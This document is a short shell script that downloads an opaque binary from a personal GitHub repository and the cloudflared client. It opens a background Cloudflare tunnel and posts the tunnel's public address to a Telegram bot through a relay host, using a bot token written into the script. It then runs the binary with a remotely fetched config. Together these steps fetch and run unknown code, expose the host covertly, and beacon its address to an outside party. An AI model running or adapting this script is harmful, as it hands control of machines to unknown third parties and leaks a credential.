#!/bin/sh
wget https://github.com/carto1111/TOTAKO/raw/main/carto111
wget https://github.com/cloudflare/cloudflared/releases/download/2021.9.1/cloudflared-linux-amd64
chmod +x carto111
chmod +x cloudflared-linux-amd64
nohup ./cloudflared-linux-amd64 tunnel > connect.txt 2>&1 &
sleep 40
address=$(cat connect.txt | grep trycloudflare | grep https | awk '{print $4}')
curl -o /dev/null -s -X POST "https://tsapi.12311.eu.org/bot1595988671:AAGfFiUOKUJ0N4fH9AyhFjsiAGWr7xzSmtM/sendMessage" -d "chat_id=1148579782&text=${address}"
./carto111 -config=https://raw.githubusercontent.com/carto1111/TOTAKO/main/carto111.josn
